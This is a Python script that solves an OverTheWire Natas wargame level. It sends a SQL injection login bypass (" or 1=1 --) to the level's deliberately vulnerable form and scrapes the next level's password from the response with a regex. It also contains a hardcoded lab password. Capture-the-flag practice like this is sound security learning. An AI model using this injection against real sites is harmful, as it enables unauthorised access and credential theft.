import requests
import re

user = 'natas14'
passw = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
url = 'http://%s.natas.labs.overthewire.org/' % user



# 1st step:  print the sourcecode
'''
response = requests.get(url, auth=(user, passw))
print(response.text)
'''
# hmm seems like a login form, let's basic SQL injection



# 2nd step:  sql injection
'''
response = requests.post(url, auth=(user, passw), data={ "username" : '" or 1=1 -', "password" : '" or 1=1 -- '})
print(response.text)
'''

# first, tried: ' or 1=1 --     did not work
# then, tried: " or 1=1 --      did work!

# 3rd step:  
response = requests.post(url, auth=(user, passw), data={ "username" : '" or 1=1 -', "password" : '" or 1=1 -- '})
webPage = response.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())




